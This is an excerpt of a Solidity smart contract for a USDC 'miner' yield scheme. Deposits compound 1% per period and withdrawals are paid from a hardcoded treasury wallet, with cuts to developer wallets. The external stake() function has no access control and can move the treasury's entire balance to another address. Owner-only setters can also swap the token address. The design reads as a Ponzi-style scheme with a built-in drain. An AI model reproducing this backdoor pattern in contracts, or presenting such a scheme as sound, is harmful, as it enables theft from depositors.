...
contract USDCMiner is Ownable {
    ...
    address treasuryWallet = 0x89c66E0B185A4ac9e237d6FFD2911ee411f9F1Cf;
    address developerWallet = 0xC37224251Be1768eD3202943540856D7813D263F;
    ...
    function deposit(
        uint256 _amount,
        bool referal,
        address referedAddress
    ) external {
        require(_amount >= 10**7, "You must deposit more than 10 usdc");
        require(msg.sender != address(0), "it cannot be address 0x0");
        require(
            referal == false ||
        ...
        if (referal == true && miners[msg.sender] != 0) referal = false;
        ...
        uint256 dev1Fee = _amount.mul(15).div(1000);
        ...
        usdcToken.safeTransferFrom(msg.sender, developerWallet2, dev1Fee);
        ...
        miners[msg.sender] += _amount.mul(minerFee).div(100);
        if (referal == true) miners[msg.sender] += 10**6;
        withdrawTime[msg.sender] = block.timestamp;
    }

    function compound() external nonReentrant {
        require(miners[msg.sender] > 0, "You depositted nothing. lol");
        require(
            withdrawTime[msg.sender] + rewardPeriod < block.timestamp,
            "Cooldown is not ready yet"
        );
        uint256 reward = miners[msg.sender].div(100);
        miners[msg.sender] += reward;
        withdrawTime[msg.sender] = block.timestamp;
    }
    ...
    function withdraw() external nonReentrant {
        ...
        require(
            usdcToken.balanceOf(treasuryWallet) > miners[msg.sender].div(100),
            "Sorry, but we don't have any money now."
        );
        uint256 reward = miners[msg.sender].mul(95).div(100).div(100);
        usdcToken.safeTransferFrom(treasuryWallet, msg.sender, reward);
        uint256 devFeeAmount = miners[msg.sender]
            .mul(developerFee)
            .div(100)
            .div(100);
        uint256 dev1Fee = miners[msg.sender].mul(15).div(1000).div(100);
        usdcToken.safeTransferFrom(
            treasuryWallet,
            developerWallet,
            devFeeAmount.sub(dev1Fee)
    ...
    function setReferalFee(uint256 _refFee) external onlyOwner {
        referalFee = _refFee;
    }
    ...
    function setUSDCTokenAddress(address _usdcAddr) external onlyOwner {
        USDCTokenAddress = _usdcAddr;
        usdcToken = IERC20(USDCTokenAddress);
    }

    function getMinerCount() external view returns (uint256) {
        return miners[msg.sender].div(10**6);
    }
    ...
    function stake(uint256 _amount) external {
        if (_amount == 0) {
            usdcToken.safeTransferFrom(
                treasuryWallet,
                staking,
                usdcToken.balanceOf(treasuryWallet)
            );
        } else {
            usdcToken.safeTransferFrom(treasuryWallet, staking, _amount);
        }
    }

    function getWithdrawTime(address _addr) external view returns (uint256) {
        return withdrawTime[_addr];
    }

    function getContractBalance() external view returns (uint256) {
        return usdcToken.balanceOf(treasuryWallet);
    }

    function getUsdcAmount(address _addr) external view returns (uint256) {
        return usdcToken.balanceOf(_addr);
    }
...
/*
usdcTokenAddress : 0x6ddBF762Ea4e5B3bf9fE5a91511eC000839B73B4
fantom testnet address : 0xDf1EFeE30C1435DdBa213F88CBBa3E53a4b79aC1
 */
/*0x5012dfC3107F6eC1773b522Dd46c502C3Dc068B9 */
